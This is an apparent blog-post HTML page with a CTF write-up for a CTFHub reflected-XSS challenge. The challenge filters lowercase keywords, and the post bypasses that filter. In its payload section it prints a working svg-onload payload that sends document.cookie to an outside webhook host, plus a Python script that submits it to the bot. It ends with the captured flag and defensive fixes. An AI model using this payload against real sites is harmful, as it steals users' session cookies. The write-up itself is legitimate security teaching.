@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub XSS 关键字过滤 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; word-break: break-all; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; white-space: pre-wrap; word-break: break-all; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
+        th, td { border: 1px solid #e2e8f0; padding: 10px 12px; text-align: left; vertical-align: top; }
+        th { background: #f8fafc; color: #334155; }
+        td { color: #475569; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - XSS - 关键字过滤</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># XSS</span>
+            <span class="tag"># 关键字过滤</span>
+            <span class="tag"># Bot 外带</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>XSS 关键字过滤</li>
+            <li><strong>题目方向：</strong>Web - XSS - 反射型</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>绕过关键字过滤执行 XSS，读取 Bot Cookie 中的 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>访问根路径后会重定向到 <code>/?name=CTFHub</code>，页面将输入直接拼接到 <code>&lt;h1&gt;</code> 标签中，且没有进行 HTML 实体编码：</p>
+        <pre>&lt;h1&gt;Hello, CTFHub
+&lt;/h1&gt;</pre>
+        <p>输入不同标签后可以确认服务端使用了大小写敏感的字符串黑名单。它只删除小写的部分关键字，并不等于阻止脚本执行：</p>
+        <table>
+            <thead>
+                <tr><th>输入</th><th>页面输出</th><th>结论</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td><td><code>&lt;&gt;alert(1)&lt;/&gt;</code></td><td>小写 <code>script</code> 被删除</td></tr>
+                <tr><td><code>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></td><td>原样输出</td><td>大小写混写可绕过</td></tr>
+                <tr><td><code>&lt;img src=x onerror=alert(1)&gt;</code></td><td><code>&lt; src=x =alert(1)&gt;</code></td><td><code>img</code>、<code>onerror</code> 被删除</td></tr>
+                <tr><td><code>&lt;svg onload=...&gt;</code></td><td>原样输出</td><td>可直接触发事件</td></tr>
+            </tbody>
+        </table>
+        <p class="note">黑名单过滤无法覆盖 HTML 标签、事件属性和大小写变体。仅过滤几个固定字符串不能作为 XSS 防护措施。</p>
+
+        <h2>三、构造外带 Payload</h2>
+        <p>创建一个临时 Webhook，使用不受过滤影响的 <code>svg onload</code> 事件读取 <code>document.cookie</code>，并发送到回连地址。使用 <code>encodeURIComponent</code> 可确保 Cookie 中的分号等字符不会破坏 URL：</p>
+        <pre>&lt;svg onload=fetch('https://webhook.site/&lt;token&gt;/?c='+encodeURIComponent(document.cookie))&gt;</pre>
+        <p>将 Payload 放入 <code>name</code> 参数并提交给 Bot：</p>
+        <pre>import requests
+from urllib.parse import quote
+
+base = "http://challenge-&lt;id&gt;.sandbox.ctfhub.com:10800"
+payload = "&lt;svg onload=fetch('https://webhook.site/&lt;token&gt;/?c='+encodeURIComponent(document.cookie))&gt;"
+target = base + "/?name=" + quote(payload, safe="")
+
+r = requests.post(base + "/submit", json={"url": target}, timeout=30)
+print(r.text)</pre>
+        <p>提交成功时接口返回：</p>
+        <pre>{
+  "code": 0,
+  "msg": "Successfully"
+}</pre>
+
+        <h2>四、读取回连结果</h2>
+        <p>Bot 使用 HeadlessChrome 访问目标 URL，页面加载时执行 <code>onload</code>，将可读 Cookie 发送到 Webhook。回连查询参数中成功得到 Flag：</p>
+        <pre>GET /?c=flag%3Dctfhub%7B720e3e2b7477b6899aebca55%7D</pre>
+        <p>URL 解码后为 <code>flag=ctfhub{720e3e2b7477b6899aebca55}</code>。</p>
+
+        <h2>五、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{720e3e2b7477b6899aebca55}
+        </div>
+
+        <h2>六、修复建议</h2>
+        <ul>
+            <li>根据输出上下文对不可信输入进行 HTML 实体编码，禁止直接拼接用户输入。</li>
+            <li>不要依赖关键字黑名单；如需过滤，也只能作为纵深防御，不能替代输出编码。</li>
+            <li>为敏感 Cookie 设置 <code>HttpOnly</code>、<code>Secure</code> 和合适的 <code>SameSite</code> 属性。</li>
+            <li>部署 CSP，通过 <code>script-src</code>、<code>connect-src</code> 等指令限制脚本执行与数据外带。</li>
+        </ul>
+    </div>
+</body>
+</html>
